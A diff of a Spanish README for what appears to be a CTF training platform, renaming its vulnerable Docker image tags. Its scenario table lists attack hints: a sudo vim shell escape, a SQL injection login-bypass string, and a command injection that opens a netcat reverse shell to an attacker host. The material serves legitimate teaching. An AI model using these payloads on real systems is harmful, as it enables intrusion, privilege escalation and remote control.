@@ -70,10 +70,10 @@ uv sync --all-extras
 ### Construir las 4 imágenes Docker
 
 ```bash
-docker build -t flexipwn/vulnerable-sudo:latest docker/privesc/
-docker build -t vuln-sqli-mysql                 docker/sqli-mysql/
-docker build -t vuln-command-injection          docker/vuln-command-injection/
-docker build -t flexipwn-attacker               docker/attacker/
+docker build -t flexipwn/vuln-sudo              docker/privesc/
+docker build -t flexipwn/vuln-sqli-mysql        docker/sqli-mysql/
+docker build -t flexipwn/vuln-command-injection docker/vuln-command-injection/
+docker build -t flexipwn/attacker               docker/attacker/
 ```
 
 ---
@@ -211,11 +211,11 @@ El `<env_id>` se le entrega al estudiante junto con sus credenciales SSH.
 
 | Escenario | Categoría | Nivel | Vulnerable | Pista clave |
 |---|---|---|---|---|
-| `privesc-demo.yaml` — Privilege escalation via sudo vim | pwning | beginner | `flexipwn/vulnerable-sudo` (sshd + sudo NOPASSWD vim) | `ssh ctfuser@flexipwn-<env>-vulnerable` → `sudo vim -c ':!bash'` |
-| `sqli-mysql-demo.yaml` — SQL injection login bypass | web | beginner | `vuln-sqli-mysql` (Flask + MySQL en `:5001`) | POST a `/` con `username=admin' OR '1'='1' -- ` |
-| `command-injection-demo.yaml` — Command Injection → Reverse Shell | web | intermediate | `vuln-command-injection` (Flask en `:5001`, `/ping?host=`) | Inyectar `;nc <attacker> 4444 -e /bin/bash` y `nc -lvp 4444` en el atacante |
+| `privesc-demo.yaml` — Privilege escalation via sudo vim | pwning | beginner | `flexipwn/vuln-sudo` (sshd + sudo NOPASSWD vim) | `ssh ctfuser@flexipwn-<env>-vulnerable` → `sudo vim -c ':!bash'` |
+| `sqli-mysql-demo.yaml` — SQL injection login bypass | web | beginner | `flexipwn/vuln-sqli-mysql` (Flask + MySQL en `:5001`) | POST a `/` con `username=admin' OR '1'='1' -- ` |
+| `command-injection-demo.yaml` — Command Injection → Reverse Shell | web | intermediate | `flexipwn/vuln-command-injection` (Flask en `:5001`, `/ping?host=`) | Inyectar `;nc <attacker> 4444 -e /bin/bash` y `nc -lvp 4444` en el atacante |
 
-Todos usan `flexipwn-attacker` como imagen del atacante. El puerto interno **5001** se usa en todos los servicios HTTP por compatibilidad con macOS (puerto 5000 reservado por AirPlay).
+Todos usan `flexipwn/attacker` como imagen del atacante. El puerto interno **5001** se usa en todos los servicios HTTP por compatibilidad con macOS (puerto 5000 reservado por AirPlay).
 
 ---
 
